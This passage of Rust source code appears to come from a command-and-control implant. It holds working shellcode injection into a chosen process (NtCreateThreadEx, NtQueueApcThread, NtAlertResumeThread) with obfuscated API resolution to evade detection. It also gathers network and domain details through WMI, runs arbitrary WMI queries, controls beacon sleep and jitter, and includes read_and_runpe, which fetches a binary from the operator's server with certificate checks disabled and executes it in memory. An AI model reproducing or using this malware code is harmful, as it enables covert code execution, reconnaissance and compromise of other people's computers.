            ProcessHandle: HANDLE,
            lpStartAddress: LPTHREAD_START_ROUTINE,
            lpParameter: LPVOID,
            CreateSuspended: BOOL,
            StackZeroBits: ULONG,
            SizeOfStackCommit: SIZE_T,
            SizeOfStackReserve: SIZE_T,
            lpBytesBuffer: LPVOID,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //define empty hRemoteThread handle
        let mut hRemoteThread: HANDLE = std::ptr::null_mut();

        //convert the address of RtlExitUserThread_address to a LPTHREAD_START_ROUTINE
        let remote_address: LPTHREAD_START_ROUTINE =
            std::mem::transmute(remote_thread_start_address);

        let resultcreatethread = NtCreateThreadEx(
            &mut hRemoteThread,
            0x1FFFFF,
            std::ptr::null_mut(),
            new_handle,
            remote_address,
            std::ptr::null_mut(),
            1,
            0,
            0xfffff,
            0xfffff,
            std::ptr::null_mut(),
        );

        //trigger the thread with NtQueueApcThread

        //locate the NtQueueApcThread function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtQueueApcThread"));

        //define NtQueueApcThread function

        let NtQueueApcThread: unsafe fn(
            ThreadHandle: HANDLE,
            ApcRoutine: PPS_APC_ROUTINE,
            ApcRoutineContext: PVOID,
            ApcStatusBlock: PVOID,
            ApcReserved: PVOID,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //convert scbase2 to a PPS_APC_ROUTINE
        let scbase2: PPS_APC_ROUTINE = std::mem::transmute(scbase2 as usize);

        let triggerresult = NtQueueApcThread(
            hRemoteThread,
            scbase2,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        //check triggerresult
        //println!("triggerresult: {}", triggerresult);

        //now we can resume the thread with NtAlertResumeThread

        //locate the NtAlertResumeThread function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtAlertResumeThread"));

        //define NtAlertResumeThread function

        let NtAlertResumeThread: unsafe fn(
            ThreadHandle: HANDLE,
            PreviousSuspendCount: PULONG,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        let mut previous_suspend_count: ULONG = 0;

        let resumeresult = NtAlertResumeThread(hRemoteThread, &mut previous_suspend_count);

        //now we can wait for the thread to finish with NtWaitForSingleObject

        //locate the NtWaitForSingleObject function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtWaitForSingleObject"));

        //define NtWaitForSingleObject function

        let NtWaitForSingleObject: unsafe fn(
            Handle: HANDLE,
            Alertable: BOOLEAN,
            Timeout: PLARGE_INTEGER,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //define timeout2 in the same fashion, but make it equal to 1 second

        let timeout = std::mem::transmute::<&mut i64, &mut LARGE_INTEGER>(&mut 10000000);

        let waitresult = NtWaitForSingleObject(hRemoteThread, 1, timeout);

        //if the waitresult is 0, the thread has finished
        //return the result of the thread execution
        //for now lets just assume if we made it this far we are good
        //return a success message

        return "Success".to_string();
    }; //end unsafe
} //end injection function

//this function needs the address of kernel32 and ntdll
fn exshellcode(target_pid: &str, scode: Vec<u8>) -> String {
    let target_pid: DWORD = target_pid.parse().unwrap();

    let scode = scode.clone();

    //get handle to target process

    let mut target_handle: HANDLE = 0 as HANDLE;

    let ntdll_handle = ldr_get_dll(&lc!("ntdll.dll"));

    //get the function pointer for NtGetNextProcess
    let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtGetNextProcess"));

    //define NtGetNextProcess function

    let NtGetNextProcess: unsafe fn(HANDLE, ACCESS_MASK, u32, u32, *mut HANDLE) -> NTSTATUS =
        unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let mut handle: HANDLE = 0 as _;

    //we already have pid from user

    let process_id: DWORD = target_pid;

    //resolve GetProcessId

    let kernel32_handle = ldr_get_dll(&lc!("kernel32.dll"));
    let getnext_func = ldr_get_fn(kernel32_handle, &lc!("GetProcessId"));

    //define GetProcessId function

    let GetProcessId: unsafe fn(HANDLE) -> DWORD =
        unsafe { std::mem::transmute(getnext_func as FARPROC) };

    //we already have the pid, just get a handle to it

    while unsafe { NtGetNextProcess(handle, MAXIMUM_ALLOWED, 0, 0, &mut handle) } == 0 {
        //instead of getting module name, get the pid
        let pid: DWORD = 0 as _;
        let pid = unsafe { GetProcessId(handle) };
        if pid == process_id {
            target_handle = handle;
            break;
        }
        //otherwise keep looping
    }

    //println!("Getting handle to target process...");

    //println!("Process Handle: {:x?}", target_handle);

    //is that a pseudo handle? lets pass it to duplicate handle and see what happens

    //get the function pointer for DuplicateHandle
    let kernel32_handle = ldr_get_dll(&lc!("kernel32.dll"));
    let getnext_func = ldr_get_fn(kernel32_handle, &lc!("DuplicateHandle"));

    //define DuplicateHandle function

    let DuplicateHandle: unsafe fn(
        HANDLE,
        HANDLE,
        HANDLE,
        *mut HANDLE,
        ACCESS_MASK,
        BOOL,
        DWORD,
    ) -> BOOL = unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let mut new_handle: HANDLE = 0 as HANDLE;

    let mut duplicate_result: BOOL = 0;

    //resolve GetCurrentProcess

    let getnext_func = ldr_get_fn(kernel32_handle, &lc!("GetCurrentProcess"));

    //define GetCurrentProcess function

    let GetCurrentProcess: unsafe fn() -> HANDLE =
        unsafe { std::mem::transmute(getnext_func as FARPROC) };

    duplicate_result = unsafe {
        DuplicateHandle(
            GetCurrentProcess(),
            target_handle,
            GetCurrentProcess(),
            &mut new_handle,
            0,
            0,
            0x00000002,
        )
    };

    //check if duplicate handle was successful
    /*
        if duplicate_result == 0 {
            println!("Failed to duplicate handle!");
        } else {
            println!("Handle duplicated successfully!");
        }
    */
    //print the new handle

    //println!("New handle: {:x?}", new_handle);

    //call our process injection here
    let result = injection(new_handle, scode);

    //get pointer to CloseHandle

    let getnext_func = ldr_get_fn(kernel32_handle, &lc!("CloseHandle"));

    //define CloseHandle function

    let CloseHandle: unsafe fn(HANDLE) -> BOOL =
        unsafe { std::mem::transmute(getnext_func as FARPROC) };

    //close the new process handle
    unsafe {
        let mut close_result: i32 = 0;

        close_result = CloseHandle(new_handle);
    };

    //return the result of the injection
    result
} //end of exshellcode function

//try to use wmi to get the ipv4 addresses in use by the system
use wmi::{COMLibrary, Variant, WMIConnection};
use std::collections::HashMap;

// Retrieves network information for all network adapters on the system that are enabled.
pub fn get_network_info() -> String {
    // Stores the formatted network information strings for each network adapter.
    let mut network_info: Vec<String> = Vec::new();

    // Initialize the COM library to make WMI calls. Return an error message if it fails.
    let com_con = match COMLibrary::new() {
        Ok(con) => con,
        Err(_) => return "Error initializing COM Library".to_string(),
    };

    // Establish a connection to WMI. Return an error message if it fails.
    let wmi_con = match WMIConnection::new(com_con.into()) {
        Ok(con) => con,
        Err(_) => return "Error connecting to WMI".to_string(),
    };

    // Define the WMI query to select necessary fields from network adapters that are enabled.
    let query = "SELECT Description, IPAddress, IPSubnet, DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE";
    // Execute the WMI query and store the results. Return an error message if it fails.
    let results: Vec<HashMap<String, Variant>> = match wmi_con.raw_query(query) {
        Ok(results) => results,
        Err(_) => return "Error executing WMI query".to_string(),
    };

    // Iterate over each result (network adapter) from the query.
    for result in results {
        // Extract the description of the network adapter, defaulting to an empty string if not found.
        let description = result.get("Description").and_then(|v| match v {
            Variant::String(s) => Some(s.clone()),
            _ => None,
        }).unwrap_or_default();

        // Extract the IP addresses, filtering for IPv4 addresses, and default to an empty vector if not found.
        let ip_addresses = result.get("IPAddress").and_then(|v| match v {
            Variant::Array(arr) => Some(arr.iter().filter_map(|ip| match ip {
                Variant::String(s) if s.contains('.') => Some(s.clone()), // Filter for IPv4 addresses
                _ => None,
            }).collect()),
            _ => None,
        }).unwrap_or_else(Vec::new);

        // Extract the IP subnets, defaulting to an empty vector if not found.
        let ip_subnets = result.get("IPSubnet").and_then(|v| match v {
            Variant::Array(arr) => Some(arr.iter().filter_map(|ip| match ip {
                Variant::String(s) => Some(s.clone()),
                _ => None,
            }).collect()),
            _ => None,
        }).unwrap_or_else(Vec::new);

        // Extract the default gateways, defaulting to an empty vector if not found.
        let default_gateways = result.get("DefaultIPGateway").and_then(|v| match v {
            Variant::Array(arr) => Some(arr.iter().filter_map(|ip| match ip {
                Variant::String(s) => Some(s.clone()),
                _ => None,
            }).collect()),
            _ => None,
        }).unwrap_or_else(Vec::new);

        // If there are IP addresses found, format and add the adapter information to the network_info vector.
        if !ip_addresses.is_empty() {
            let info = format!(
                "Adapter: {}\nIP Address(es): {}\nSubnet Mask(s): {}\nDefault Gateway(s): {}\n---",
                description,
                ip_addresses.join(", "),
                ip_subnets.get(0).unwrap_or(&"".to_string()),
                default_gateways.get(0).unwrap_or(&"".to_string())
            );
            network_info.push(info);
        }
    }

    // If no network information was found, return a message indicating so. Otherwise, join and return the collected information.
    if network_info.is_empty() {
        "No network information found".to_string()
    } else {
        network_info.join("\n")
    }
}

pub fn get_system_domain() -> String {
    let query = "SELECT Domain FROM Win32_ComputerSystem";
    let com_con = match COMLibrary::new() {
        Ok(con) => con,
        Err(_) => return "Error initializing COM Library".to_string(),
    };

    let wmi_con = match WMIConnection::new(com_con.into()) {
        Ok(con) => con,
        Err(_) => return "Error connecting to WMI".to_string(),
    };

    let results: Vec<HashMap<String, Variant>> = match wmi_con.raw_query(query) {
        Ok(results) => results,
        Err(_) => return "Error executing WMI query".to_string(),
    };

    if let Some(result) = results.first() {
        if let Some(Variant::String(domain)) = result.get("Domain") {
            domain.clone()
        } else {
            "Unknown domain".to_string()
        }
    } else {
        "Unknown domain".to_string()
    }
}

// Runs a WMI query with the provided query parts and returns the formatted results.
pub fn run_wmi_query(query_parts: Vec<&str>) -> String {
    // Convert the query Vec<&str> to a single query string.
    let query = query_parts[1..].join(" ");

    //TODO remove this print statement after testing
    //println!("Query: {:?}", query);
    let com_con = match COMLibrary::new() {
        Ok(con) => con,
        Err(_) => return "Error initializing COM Library".to_string(),
    };

    let wmi_con = match WMIConnection::new(com_con.into()) {
        Ok(con) => con,
        Err(_) => return "Error connecting to WMI".to_string(),
    };

    let results: Vec<HashMap<String, Variant>> = match wmi_con.raw_query(query) {
        Ok(results) => results,
        Err(_) => return "Error executing WMI query".to_string(),
    };

    let mut output: Vec<String> = Vec::new();

    for result in results {
        for (key, value) in result {
            let value_str = match value {
                Variant::String(s) => s.clone(),
                Variant::UI4(u) => u.to_string(),
                Variant::I4(i) => i.to_string(),
                Variant::Bool(b) => b.to_string(),
                Variant::Array(arr) => arr.iter().map(|v| match v {
                    Variant::String(vs) => vs.clone(),
                    Variant::UI4(u) => u.to_string(),
                    Variant::I4(i) => i.to_string(),
                    Variant::Bool(b) => b.to_string(),
                    Variant::UI8(u) => u.to_string(),
                    Variant::I8(i) => i.to_string(),
                    // Removed Float, Double, Binary, DateTime from here
                    Variant::Null => "null".to_string(),
                    _ => "Unsupported Variant type in array".to_string(),
                }).collect::<Vec<_>>().join(", "),
                Variant::UI8(u) => u.to_string(),
                Variant::I8(i) => i.to_string(),
                // Removed Float, Double, Binary, DateTime from here
                _ => "Unsupported Variant type".to_string(),
            };
            //println!("{}: {}", key, value_str);
            output.push(format!("{}: {}", key, value_str));
        }
    }

    if output.is_empty() {
        "No results found".to_string()
    } else {
        format!("\n{}", output.join("\n"))
    }
}

pub fn change_sleep(args: Vec<&str>, sleep: &mut String, jitter: &mut String) -> String {
    // Initialize default values
    let mut sleep_time = "0".to_string();
    let mut new_jitter = "0".to_string();

    // Check if the required arguments are present
    if args.len() < 2 {
        return "Missing required arguments".to_string();
    }

    // Attempt to parse sleep_time from args[1]
    match args[1].parse::<u64>() {
        Ok(parsed) => sleep_time = parsed.to_string(),
        Err(_) => return "Invalid integer for sleep time".to_string(),
    }

    // Update imp_info.sleep only if a valid integer is provided
    *sleep = sleep_time.clone();

    // Attempt to parse new_jitter from args[2] if present
    if args.len() > 2 {
        match args[2].parse::<u64>() {
            Ok(parsed) => new_jitter = parsed.to_string(),
            Err(_) => return "Invalid integer for jitter".to_string(),
        }
    }

    // Update jitter only if a valid integer is provided
    *jitter = new_jitter.clone();

    // Return a success message with the updated sleep time and jitter
    format!("Sleep time set to {} seconds with jitter of {} percent", &sleep_time, &jitter)
    
}

pub fn read_and_runpe (args: Vec<&str>, server: String, imp_token: String) -> String {
    //initialize file_path variable
    let mut file_path = "";
    //if the args array has more than 1 element, set file_path to the 2nd element in the array
    if args.len() > 1 {
        file_path = args[1];
    }

    //print file_path for debug
    //println!("File Path: {:?}", file_path);

    //perform download of the binary data from the server /download endpoint, sending the filename as a header value
    //for x-filename

    //download the file from the server
    //when the download is complete, we'll keep the binary data in a buffer in memory

    //initialize variables for the request
    let user_agent = "Mozilla/5.0";
    let server_name = server; // The server name to download the file from
    let endpoint = format!("/download"); // The endpoint to download the file

    // Print server_name for debug
    //println!("Server Name: {:?}", server_name);

    //initialize file_content variable to store the binary data
    let mut file_content = Vec::new();

    //create a new reqwest client
    let client = Client::builder()
        .user_agent(user_agent)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    //create the url to download the file from
    let url = format!("https://{}{}", server_name, endpoint);

    //send the request to download the file
    let mut response = client
        .get(&url)
        .header("X-Filename", file_path)
        .header("X-Session", imp_token)
        .send()
        .expect("Failed to send request");

    //check the response status
    if !response.status().is_success() {
        //println!("Request failed with status: {}", response.status());
    } else {
        response
            //read the response into the file_content buffer
            .read_to_end(&mut file_content)
            .expect("Failed to read response");
    }

    //convert the buffer to a slice of raw parts
    //let buffer = unsafe { std::slice::from_raw_parts(file_content.as_ptr(), file_content.len()) };

    let args_clone = args.iter().map(|&s| s.to_string()).collect::<Vec<String>>();

    //create bofresult variable to store the result of the buffer execution
    let mut peresult = String::new();

    //initialize bofargs variable to store the arguments for the buffer
    //if the args_clone array has more than 2 elements, set bofargs to the 3rd element in the array
    //otherwise, set bofargs to an empty string
    let bofargs = if args_clone.len() > 2 {
        args_clone[2].clone()
    } else {
        "".to_string()
    };

    //we should never have more than 3 elements in the args_clone array
    //if the args_clone array has more than 3 elements, return an error
    //otherwise, get the args from args_clone[2] and pass it to the next function as a String
    if args_clone.len() > 3 {
        peresult = "Error: Too many arguments".to_string();
    } else {
        //if the args_clone array has more than 2 elements, execute the buffer with the 3rd element as the arguments
        match oxide_ldr::dotloader(file_content, bofargs) {
            Ok(result) => {
                peresult = result;
                //println!("Result: {:?}", bofresult);
            }
            Err(e) => {
                peresult = format!("Error: {:?}", e);
            }
        }
    }

    //return the result of the buffer execution
    let content = peresult;
    //println!("Content: {:?}", content);

    //return the content
    content
} //read_and_exec